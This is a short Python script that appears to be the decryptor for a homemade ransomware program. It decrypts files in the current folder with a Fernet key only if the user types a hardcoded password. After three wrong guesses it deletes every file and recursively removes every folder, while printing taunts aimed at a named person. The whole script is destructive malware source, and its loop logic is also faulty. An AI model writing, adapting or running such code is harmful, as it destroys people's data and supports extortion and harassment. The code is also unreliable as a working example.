#!/usr/bin/env python3
'''
pip install cryptography
'''
import os
from cryptography.fernet import Fernet
import sys
import shutil

files = []
folders = []

for folder in os.listdir():
    if os.path.isfile(folder):
        continue
    else:
        folders.append(folder)
# For finding folders

for file in os.listdir():
    if file == "payback.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
# For finding files

print(files)
print(folders)

with open("thekey.key","rb") as key:
    secretkey = key.read()

secretphrase = "MaanavIsStupid1234!"

attempts = 3

while attempts > 0:

    user_phrase = input("Enter the password to decrypt everything.\n")

    if user_phrase == secretphrase:
        print("Alright fine here's your files. But your folders will remain like that.")
        for file in files:
            with open(file,"rb") as thefile:
                contents = thefile.read()
            
            contents_decrypted = Fernet(secretkey).decrypt(contents)

            with open(file,"wb") as thefile:
                thefile.write(contents_decrypted)
    else:
        attempts = attempts-1
        print("WRONG! YOU HAVE " + str(attempts) + " LEFT TO TELL ME WHERE MY BLAZER IS BOZO\n")
        if attempts == 0:
            print("Say goodbye to everything.\n")
            for file in files:
                os.remove(file)
            for folder in folders:
                shutil.rmtree(folder)